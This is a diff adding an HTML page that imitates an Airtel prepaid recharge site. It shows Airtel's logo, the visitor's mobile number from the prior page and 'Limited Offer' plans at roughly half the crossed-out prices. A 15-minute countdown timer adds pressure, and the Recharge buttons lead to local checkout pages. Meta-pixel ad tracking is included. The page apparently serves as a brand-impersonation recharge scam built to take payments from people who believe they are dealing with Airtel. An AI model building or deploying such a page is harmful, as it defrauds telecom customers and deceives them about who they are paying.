@@ -1,0 +1,522 @@
+
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <link rel="icon" href="Airtelicon.png">
+    <link rel="apple-touch-icon" href="Airtelicon.png">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <title>Airtel Prepaid Plans</title>
+    <link href="Plans.css" rel="stylesheet">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">    
+    <script src="https://kit.fontawesome.com/f4f2517463.js" crossorigin="anonymous"></script>
+    <!--Coding by Rk coding program-->
+    <!-- website CEO :- Priya Singh -->
+       <!-- Run Api JavaScript -->
+    <!--js .log function required -->
+    
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '330883390059253');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=330883390059253&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->    <style>
+        .bg-slate-200 {
+            --tw-bg-opacity: 1;
+            border: 1px solid #CCC;
+            background-color: rgb(255 255 255);
+        }
+        
+        .Logo665{
+          width:7%;
+          
+        }
+        
+       
+   .priyakk{
+    background-color:#0a2885;
+    width:280px; 
+    height: 22px; 
+    margin-top: 25px; 
+    margin-left: auto; 
+    margin-right: auto; 
+    padding: 7px; 
+    color: #fff;
+    font-weight:700;
+    font-size: 16px;
+    font-family:Arial;
+    text-align: center; 
+    border: 2px solid #0a2885 ; 
+    border-radius: 34px;
+    outline: none; 
+    display: block; 
+    text-decoration: none;
+    
+  }
+          
+        
+
+        
+    </style>
+</head>
+<body>
+  
+  
+  		<script>
+
+		window.onload=function(){
+
+			document.getElementById('loader').style.display="none";
+			document.getElementById('content').style.display="block";
+		};
+		</script>
+		<style>
+		#content{display:none;}
+		#loader{
+	 background: #fff url(Rolling.gif) no-repeat center center;
+    background-size:60px;
+    height: 100vh;
+    width: 100%;
+    position: fixed;
+    z-index: 100;
+
+		}
+		#loader img{width:400px;}
+		</style>
+	</head>
+	<body>
+		<div id="loader">
+		
+		</div>
+		<div id="content">
+  
+  
+ 
+    
+
+ <!-- Web developer Priya Singh > -->
+
+
+    <div id="root">
+        <div class="py-4 px-6 bg-blue-700 flex items-center justify-between text-white">Mobile Recharge
+        
+        
+                <i class="bx bxs-badge-check fa-xl" style="color: #5bc0f8;"></i>
+                
+<div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+    <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               
+           <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+    <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+               
+                   <div></div>
+               <div></div>
+               <div></div>
+               <div></div>
+
+            </div>
+            <div>
+
+
+
+
+
+
+
+
+
+        </div>
+        <div>
+
+            <div class="bg-slate-100 py-4 px-4 text-[14px] flex items-center justify-between">
+              
+                              <img class="Logo665" src="Airtel.png" alt="Airtel">
+              
+            <div>Recharging for <span class="font-bold text-[14px]" id="mobile_number_"></span></div><a class="text-blue-600" href="Airtel.html">Change</a>
+                
+     
+
+            </div>
+
+                <script>
+                    // Function to fetch text from another page (implementation depends on your approach)
+                    var mobileNumber = sessionStorage.getItem('mobile_number');
+
+                    // Display the retrieved mobile number (check if it exists)
+                    if (mobileNumber) {
+                        document.getElementById('mobile_number_').textContent = mobileNumber;
+                    } else {
+                        document.getElementById('mobile_number_').textContent = "Mobile number not found.";
+                    }
+
+                    // Call fetchText function on page load (optional)
+                    // window.onload = fetchText; // Uncomment to fetch text automatically
+
+                    let minutes = 15;
+                    let seconds = 0;
+
+                    const countdown = setInterval(() => {
+                        const timerElement = document.getElementById('timer');
+
+                        if (seconds === 0) {
+                            if (minutes === 0) {
+                                clearInterval(countdown);
+                                timerElement.textContent = "Countdown ended!";
+                                return;
+                            }
+                            minutes--;
+                            seconds = 59;
+                        } else {
+                            seconds--;
+                        }
+
+                        timerElement.textContent = `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+                    }, 1000); // Start the timer on page load
+                </script>
+
+            </div>
+            <div class="pb-8 pt-6 px-4">
+                <h1 class="text-[30px] font-bold">Special Offer Plans</h1>
+                <h2 class="text-[20px] font-semibold mt-2">Limited Offer</h2>
+
+                <div class="plans">
+
+                    <div class="bg-slate-200 rounded-3xl p-4 my-8">
+                        <!-- <div class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit">SPECIAL</div> -->
+                        <div class="flex items-center justify-between my-2">
+                            <div class="flex items-center text-[20px] font-bold text-slate-800">
+                                <div>₹149</div>
+                                <div class="ml-4 line-through text-slate-600">₹299</div>
+                            </div>
+                            <div>
+
+                            </div>
+                        </div>
+                        <div class="text-[12px] text-blue-700 font-bold">View Details</div>
+                        <div class="flex items-center justify-between mt-3" style="gap: 15px;flex-flow: wrap;">
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Validity</div>
+                                <div class="text-slate-800 text-[16px] font-bold">28 days</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Data</div>
+                                <div class="text-slate-800 text-[16px] font-bold">1 GB/day</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Voice</div>
+                                <div class="text-slate-800 text-[16px] font-bold">Unlimited</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">SMS</div>
+                                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
+                            </div>
+                        </div>
+                        <div class="text-slate-600 text-[14px] mt-3"></div>
+                        <div class="flex items-center mt-2">
+
+
+                        </div>
+                        <div class="mt-5">
+
+<a class="priyakk" href="149.html">Recharge</a>
+
+
+
+                        </div>
+                    </div>
+                       <div class="bg-slate-200 rounded-3xl p-4 my-8">
+                        <!-- <div class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit">SPECIAL</div> -->
+                        <div class="flex items-center justify-between my-2">
+                            <div class="flex items-center text-[20px] font-bold text-slate-800">
+                                <div>₹898</div>
+                                <div class="ml-4 line-through text-slate-600">₹1798</div>
+                            </div>
+                            <div>
+
+                            </div>
+                        </div>
+                        <div class="text-[12px] text-blue-700 font-bold">View Details</div>
+                        <div class="flex items-center justify-between mt-3" style="gap: 15px;flex-flow: wrap;">
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Validity</div>
+                                <div class="text-slate-800 text-[16px] font-bold">84 days</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Data</div>
+                                <div class="text-slate-800 text-[16px] font-bold">3 GB/day</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Voice</div>
+                                <div class="text-slate-800 text-[16px] font-bold">Unlimited</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">SMS</div>
+                                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
+                            </div>
+                        </div>
+                        <div class="text-slate-600 text-[14px] mt-3"></div>
+                        <div class="flex items-center mt-2">
+
+                        </div>
+                        <div class="mt-5">
+
+
+ <a class="priyakk" href="PaymentCheckoutpaymentID898dbfb76e66cc042f74607baf6e42.html">Recharge</a>
+
+
+                        </div>
+                    </div>
+                        <div class="bg-slate-200 rounded-3xl p-4 my-8">
+                        <div class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit">Popular</div>
+                        <div class="flex items-center justify-between my-2">
+                            <div class="flex items-center text-[20px] font-bold text-slate-800">
+                                <div>₹596</div>
+                                <div class="ml-4 line-through text-slate-600">₹1199</div>
+                            </div>
+                            <div>
+
+                            </div>
+                        </div>
+                        <div class="text-[12px] text-blue-700 font-bold">View Details</div>
+                        <div class="flex items-center justify-between mt-3" style="gap: 15px;flex-flow: wrap;">
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Validity</div>
+                                <div class="text-slate-800 text-[16px] font-bold">84 days</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Data</div>
+                                <div class="text-slate-800 text-[16px] font-bold">1.5 GB/day</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Voice</div>
+                                <div class="text-slate-800 text-[16px] font-bold">Unlimited</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">SMS</div>
+                                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
+                            </div>
+                        </div>
+                        <div class="text-slate-600 text-[14px] mt-3"></div>
+                        <div class="flex items-center mt-2">
+
+                        </div>
+                        <div class="mt-5">
+
+ <a class="priyakk" href="PaymentCheckoutpaymentID596dbfb76e66cc042f74607baf6e42.html">Recharge</a>
+
+
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-200 rounded-3xl p-4 my-8">
+                        <div class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit">Popular</div>
+                        <div class="flex items-center justify-between my-2">
+                            <div class="flex items-center text-[20px] font-bold text-slate-800">
+                                <div>₹399</div>
+                                <div class="ml-4 line-through text-slate-600">₹799</div>
+                            </div>
+                            <div>
+
+                            </div>
+                        </div>
+                        <div class="text-[12px] text-blue-700 font-bold">View Details</div>
+                        <div class="flex items-center justify-between mt-3" style="gap: 15px;flex-flow: wrap;">
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Validity</div>
+                                <div class="text-slate-800 text-[16px] font-bold">77 days</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Data</div>
+                                <div class="text-slate-800 text-[16px] font-bold">1.5 GB/day</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Voice</div>
+                                <div class="text-slate-800 text-[16px] font-bold">Unlimited</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">SMS</div>
+                                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
+                            </div>
+                        </div>
+                        <div class="text-slate-600 text-[14px] mt-3"></div>
+                        <div class="flex items-center mt-2">
+
+                        </div>
+                        <div class="mt-5">
+                          
+                          
+ <a class="priyakk" href="PaymentCheckoutpaymentID399dbfb76e66cc042f74607baf6e42.html">Recharge</a>
+                          
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-200 rounded-3xl p-4 my-8">
+                        <div class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit">SPECIAL</div>
+                        <div class="flex items-center justify-between my-2">
+                            <div class="flex items-center text-[20px] font-bold text-slate-800">
+                                <div>₹324</div>
+                                <div class="ml-4 line-through text-slate-600">₹649</div>
+                            </div>
+                            <div>
+
+                            </div>
+                        </div>
+                        <div class="text-[12px] text-blue-700 font-bold">View Details</div>
+                        <div class="flex items-center justify-between mt-3" style="gap: 15px;flex-flow: wrap;">
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Validity</div>
+                                <div class="text-slate-800 text-[16px] font-bold">56 Days</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Data</div>
+                                <div class="text-slate-800 text-[16px] font-bold">2 GB/day</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Voice</div>
+                                <div class="text-slate-800 text-[16px] font-bold">Unlimited</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">SMS</div>
+                                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
+                            </div>
+                        </div>
+                        <div class="text-slate-600 text-[14px] mt-3"></div>
+                        <div class="flex items-center mt-2">
+
+                        </div>
+                        <div class="mt-5">
+
+
+ <a class="priyakk" href="PaymentCheckoutpaymentID324dbfb76e66cc042f74607baf6e42.html">Recharge</a>
+
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-200 rounded-3xl p-4 my-8">
+                        <div class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit">SPECIAL</div>
+                        <div class="flex items-center justify-between my-2">
+                            <div class="flex items-center text-[20px] font-bold text-slate-800">
+                                <div>₹124</div>
+                                <div class="ml-4 line-through text-slate-600">₹249</div>
+                            </div>
+                            <div>
+
+                            </div>
+                        </div>
+                        <div class="text-[12px] text-blue-700 font-bold">View Details</div>
+                        <div class="flex items-center justify-between mt-3" style="gap: 15px;flex-flow: wrap;">
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Validity</div>
+                                <div class="text-slate-800 text-[16px] font-bold">28 Days</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Data</div>
+                                <div class="text-slate-800 text-[16px] font-bold">1 GB/day</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">Voice</div>
+                                <div class="text-slate-800 text-[16px] font-bold">Unlimited</div>
+                            </div>
+                            <div class="">
+                                <div class="text-slate-600 text-[14px]">SMS</div>
+                                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
+                            </div>
+                        </div>
+                        <div class="text-slate-600 text-[14px] mt-3"></div>
+                        <div class="flex items-center mt-2">
+
+                        </div>
+                        <div class="mt-5">
+
+
+ <a class="priyakk" href="PaymentCheckoutpaymentID324dbfb76e66cc042f74607baf6e42.html">Recharge</a>
+
+                        </div>
+                    </div>
+                              
